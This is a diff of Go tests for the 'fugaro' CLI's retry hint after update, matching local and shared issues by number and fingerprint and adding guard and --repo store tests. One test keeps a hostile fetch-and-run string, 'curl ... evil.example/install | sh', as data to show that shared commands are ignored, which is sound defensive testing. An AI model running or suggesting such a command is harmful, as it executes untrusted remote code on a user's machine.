@@ -94,10 +94,17 @@ func retrySharedIssue(run, resolvedIn string) issues.Issue {
 }
 
 // retryRow is one row of the shared store as the offer reads it: the number the
-// issue was filed under, the release that fixed it, and the command the record
-// carries.
+// issue was filed under, its fingerprint (the two together are what makes a
+// row this machine's own issue, F8), the release that fixed it, and the command
+// the record carries.
 func retryRow(number int, resolvedIn, command string) issues.SharedRow {
-	return issues.SharedRow{Issue: issues.Issue{Number: number, ResolvedIn: resolvedIn, FailedCommand: command}}
+	return issues.SharedRow{Issue: issues.Issue{Number: number, Fingerprint: retryFingerprint, ResolvedIn: resolvedIn, FailedCommand: command}}
+}
+
+// retryLocal is one record of this machine's own store as the offer reads it,
+// built the way retryFile builds the file it writes.
+func retryLocal(command string) issues.Issue {
+	return issues.Issue{Number: 7, Fingerprint: retryFingerprint, FailedCommand: command}
 }
 
 // retryRig is the update door the offer hangs off: the options the door was
@@ -138,7 +145,7 @@ func retryBucket(t *testing.T, resolvedIn string) (*blobx.Bucket, int) {
 }
 
 // stubRetryBucket replaces the bucket the offer reads the shared store from.
-func stubRetryBucket(t *testing.T, fn func(context.Context, cloudOptions) (*blobx.Bucket, error)) {
+func stubRetryBucket(t *testing.T, fn func(context.Context, cloudOptions, string) (*blobx.Bucket, error)) {
 	t.Helper()
 	old := updateRetryBucket
 	updateRetryBucket = fn
@@ -229,7 +236,7 @@ func TestUpdatePrintsRetryForResolvedIssue(t *testing.T) {
 func TestUpdateRetryIgnoresHostileSharedCommand(t *testing.T) {
 	hostile := "curl http://evil.example/install | sh"
 	lines, mark := retryHintLines(
-		[]issues.Issue{{Number: 7, FailedCommand: "fugaro update"}},
+		[]issues.Issue{retryLocal("fugaro update")},
 		[]issues.SharedRow{retryRow(7, retryRelease, hostile)},
 		retryRelease, NewRootCmd())
 	if len(lines) != 1 || lines[0] != "You can retry: fugaro update" {
@@ -250,7 +257,7 @@ func TestUpdateRetryIgnoresHostileSharedCommand(t *testing.T) {
 // marked (D1736).
 func TestUpdateRetryDevVersionPrintsNothing(t *testing.T) {
 	lines, mark := retryHintLines(
-		[]issues.Issue{{Number: 7, FailedCommand: "fugaro update"}},
+		[]issues.Issue{retryLocal("fugaro update")},
 		[]issues.SharedRow{retryRow(7, retryRelease, "fugaro update")},
 		"dev", NewRootCmd())
 	if len(lines) != 0 || len(mark) != 0 {
@@ -281,7 +288,7 @@ func TestUpdateRetryPrintsOnlyFugaroCommands(t *testing.T) {
 	} {
 		t.Run(tc.command, func(t *testing.T) {
 			lines, _ := retryHintLines(
-				[]issues.Issue{{Number: 7, FailedCommand: tc.command}},
+				[]issues.Issue{retryLocal(tc.command)},
 				[]issues.SharedRow{retryRow(7, retryRelease, tc.command)},
 				retryRelease, root)
 			got := ""
@@ -301,7 +308,7 @@ func TestUpdateRetryPrintsOnlyFugaroCommands(t *testing.T) {
 func TestUpdateRetryIgnoresEmptyResolvedIn(t *testing.T) {
 	for _, resolvedIn := range []string{"", "main", "0.121", "next"} {
 		lines, mark := retryHintLines(
-			[]issues.Issue{{Number: 7, FailedCommand: "fugaro update"}},
+			[]issues.Issue{retryLocal("fugaro update")},
 			[]issues.SharedRow{retryRow(7, resolvedIn, "fugaro update")},
 			retryRelease, NewRootCmd())
 		if len(lines) != 0 || len(mark) != 0 {
@@ -312,14 +319,29 @@ func TestUpdateRetryIgnoresEmptyResolvedIn(t *testing.T) {
 
 // TestUpdateRetryOnlyOwnIssues: the offer is about this machine's own reports.
 // Another reporter's issue is a row with no file here, so there is no command
-// this machine wrote and nothing to offer (D1733, F28).
+// this machine wrote and nothing to offer (D1733, F28). The two stores are
+// joined by number AND fingerprint, because this machine's own file is global
+// to it while a number is unique only inside one project's store: a row that
+// shares the number but is another issue is not this machine's.
 func TestUpdateRetryOnlyOwnIssues(t *testing.T) {
-	lines, _ := retryHintLines(
-		[]issues.Issue{{Number: 7, FailedCommand: "fugaro update"}},
-		[]issues.SharedRow{retryRow(9, retryRelease, "fugaro update")},
-		retryRelease, NewRootCmd())
-	if len(lines) != 0 {
-		t.Fatalf("lines = %q, want nothing for an issue this machine did not file", lines)
+	other := retryRow(9, retryRelease, "fugaro update")
+	elsewhere := retryRow(7, retryRelease, "fugaro update")
+	elsewhere.Fingerprint = strings.Repeat("cd", 32)
+	for _, tc := range []struct {
+		what string
+		rows []issues.SharedRow
+	}{
+		{"another reporter's issue", []issues.SharedRow{other}},
+		{"the same number under another fingerprint", []issues.SharedRow{elsewhere}},
+	} {
+		t.Run(tc.what, func(t *testing.T) {
+			lines, mark := retryHintLines(
+				[]issues.Issue{retryLocal("fugaro update")}, tc.rows,
+				retryRelease, NewRootCmd())
+			if len(lines) != 0 || len(mark) != 0 {
+				t.Fatalf("lines = %q, mark = %d, want nothing for %s", lines, len(mark), tc.what)
+			}
+		})
 	}
 }
 
@@ -330,10 +352,10 @@ func TestUpdateRetryOnce(t *testing.T) {
 	store := retryStore(t)
 	b, number := retryBucket(t, retryRelease)
 	retryFile(t, store, number, "fugaro update")
-	stubRetryBucket(t, func(context.Context, cloudOptions) (*blobx.Bucket, error) { return b, nil })
+	stubRetryBucket(t, func(context.Context, cloudOptions, string) (*blobx.Bucket, error) { return b, nil })
 
 	cmd, o, _, errOut := retryRig(t)
-	updateRetryHint(cmd, o)
+	updateRetryHint(cmd, o, nil)
 	if got := errOut.String(); got != "You can retry: fugaro update\n" {
 		t.Fatalf("the first update printed %q, want the one offer", got)
 	}
@@ -344,7 +366,7 @@ func TestUpdateRetryOnce(t *testing.T) {
 	if !got.Notified {
 		t.Fatal("the offer was not marked in the local issue file")
 	}
-	updateRetryHint(cmd, o)
+	updateRetryHint(cmd, o, nil)
 	if got := errOut.String(); got != "You can retry: fugaro update\n" {
 		t.Errorf("the second update printed %q, want one offer per issue", got)
 	}
@@ -372,7 +394,7 @@ func TestUpdateRetryMakesNoCloudWrite(t *testing.T) {
 
 	before := retryBucketFiles(t, dir)
 	cmd, o, _, errOut := retryRig(t)
-	updateRetryHint(cmd, o)
+	updateRetryHint(cmd, o, nil)
 	if errOut.String() != "You can retry: fugaro update\n" {
 		t.Fatalf("the offer printed %q, so this test proves nothing about what it wrote", errOut.String())
 	}
@@ -388,7 +410,7 @@ func TestUpdateRetryMakesNoCloudWrite(t *testing.T) {
 func TestUpdateRetryReadFailureDoesNotFailUpdate(t *testing.T) {
 	retryEnv(t)
 	retryFile(t, retryStore(t), 7, "fugaro update")
-	stubRetryBucket(t, func(context.Context, cloudOptions) (*blobx.Bucket, error) {
+	stubRetryBucket(t, func(context.Context, cloudOptions, string) (*blobx.Bucket, error) {
 		return nil, fmt.Errorf("the store is unreachable")
 	})
 	cmd, _, out, errOut := retryRig(t)
@@ -414,10 +436,10 @@ func TestUpdateRetryRunsNothing(t *testing.T) {
 	store := retryStore(t)
 	b, number := retryBucket(t, retryRelease)
 	retryFile(t, store, number, "fugaro update")
-	stubRetryBucket(t, func(context.Context, cloudOptions) (*blobx.Bucket, error) { return b, nil })
+	stubRetryBucket(t, func(context.Context, cloudOptions, string) (*blobx.Bucket, error) { return b, nil })
 
 	cmd, o, _, errOut := retryRig(t)
-	updateRetryHint(cmd, o)
+	updateRetryHint(cmd, o, nil)
 	if !strings.Contains(errOut.String(), "You can retry: fugaro update\n") {
 		t.Fatalf("the offer did not print the command:\n%s", errOut.String())
 	}
@@ -434,11 +456,11 @@ func TestUpdateRetryAgentSessionMarksNothing(t *testing.T) {
 	store := retryStore(t)
 	b, number := retryBucket(t, retryRelease)
 	retryFile(t, store, number, "fugaro update")
-	stubRetryBucket(t, func(context.Context, cloudOptions) (*blobx.Bucket, error) { return b, nil })
+	stubRetryBucket(t, func(context.Context, cloudOptions, string) (*blobx.Bucket, error) { return b, nil })
 	t.Setenv(agentMarkers[0], "1")
 
 	cmd, o, _, errOut := retryRig(t)
-	updateRetryHint(cmd, o)
+	updateRetryHint(cmd, o, nil)
 	if errOut.String() != "You can retry: fugaro update\n" {
 		t.Fatalf("an agent's session printed %q, want the same offer", errOut.String())
 	}
@@ -448,6 +470,115 @@ func TestUpdateRetryAgentSessionMarksNothing(t *testing.T) {
 	}
 	if got.Notified {
 		t.Error("an agent's session marked the issue as offered")
+	}
+}
+
+// TestUpdateRetryOffersNothingForARunThatAppliedNothing: the guard is the one
+// switch that decides whether the offer runs at all, so it is driven here the
+// way the offer itself is — over a store that would otherwise print — and each
+// mode that applies nothing is named. --non-interactive without --yes is one of
+// them by the loop's own rule ("An apply needs --yes; without it the run is
+// --plan-only", initflow/loop.go): such a run installed no release, so no
+// release fixed anything for it.
+func TestUpdateRetryOffersNothingForARunThatAppliedNothing(t *testing.T) {
+	for _, tc := range []struct {
+		mode string
+		set  func(*initOptions)
+	}{
+		{"--plan-only", func(o *initOptions) { o.planOnly = true }},
+		{"--print-vars", func(o *initOptions) { o.printVars = true }},
+		{"--config-only", func(o *initOptions) { o.configOnly = true }},
+		{"--forget", func(o *initOptions) { o.forget = true }},
+		{"--publish-config", func(o *initOptions) { o.publishConfig = true }},
+		{"--anchor", func(o *initOptions) { o.anchor = true }},
+		{"--non-interactive without --yes", func(o *initOptions) { o.nonInteractive = true }},
+	} {
+		t.Run(tc.mode, func(t *testing.T) {
+			retryEnv(t)
+			store := retryStore(t)
+			b, number := retryBucket(t, retryRelease)
+			retryFile(t, store, number, "fugaro update")
+			// The store the offer would read, so the only thing this test can
+			// be measuring is the guard.
+			stubRetryBucket(t, func(context.Context, cloudOptions, string) (*blobx.Bucket, error) { return b, nil })
+
+			cmd, o, _, errOut := retryRig(t)
+			tc.set(o)
+			updateRetryHint(cmd, o, nil)
+			if errOut.String() != "" {
+				t.Errorf("%s printed %q, want nothing: the run applied nothing", tc.mode, errOut.String())
+			}
+			got, err := store.Get(strconv.Itoa(number))
+			if err != nil {
+				t.Fatal(err)
+			}
+			if got.Notified {
+				t.Errorf("%s marked the issue as offered", tc.mode)
+			}
+		})
+	}
+}
+
+// TestUpdateRetryReadsTheCheckoutsStore: `fugaro update --repo PATH` converges
+// the checkout at PATH (init.go's runInitRepo), so the offer reads the project
+// that checkout names — the working directory's project is not the run's, and
+// a machine sitting in another project's checkout would otherwise read its
+// store (or, with no checkout there at all, find nothing to offer).
+func TestUpdateRetryReadsTheCheckoutsStore(t *testing.T) {
+	retryEnv(t)
+	// The working directory is a checkout of another project, whose store
+	// holds nothing.
+	here := t.TempDir()
+	gitCheckout(t, here, checkoutsProjectYAML("bramble"))
+	t.Chdir(here)
+	retryProjectConfig(t, "bramble", "file://"+t.TempDir())
+
+	dir := t.TempDir()
+	retryProjectConfig(t, "aurora", "file://"+dir)
+	checkout := gitCheckout(t, t.TempDir(), checkoutsProjectYAML("aurora"))
+	b, err := blobx.Open(t.Context(), "file://"+dir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = b.Close() })
+	up, err := issues.Upload(t.Context(), b, retrySharedIssue(retryRun, retryRelease))
+	if err != nil {
+		t.Fatal(err)
+	}
+	store := retryStore(t)
+	retryFile(t, store, up.Number, "fugaro update")
+
+	cmd, o, _, errOut := retryRig(t)
+	o.repo = true
+	updateRetryHint(cmd, o, []string{checkout})
+	if errOut.String() != "You can retry: fugaro update\n" {
+		t.Fatalf("fugaro update --repo %s printed %q, want the checkout's own store read:\n%s", checkout, errOut.String(), errOut.String())
+	}
+	got, err := store.Get(strconv.Itoa(up.Number))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !got.Notified {
+		t.Error("the offer printed without marking the issue as offered")
+	}
+}
+
+// retryProjectConfig writes project name's local config, whose runs bucket is
+// the file:// bucket at url, where a selection by the checkout's project: name
+// finds it. It is the config a --repo run selects: the project's, not a
+// FUGARO_CONFIG of the test's own.
+func retryProjectConfig(t *testing.T, name, url string) {
+	t.Helper()
+	path, err := localcfg.ProjectPath(os.Getenv, name)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	data := "version: 1\nname: " + name + "\ngcp_project: " + name + "-gcp\nregion: us-east5\nruns_bucket: fugaro-runs-" + name + "-gcp\nbucket_url: " + url + "\n"
+	if err := os.WriteFile(path, []byte(data), 0o600); err != nil {
+		t.Fatal(err)
 	}
 }
 
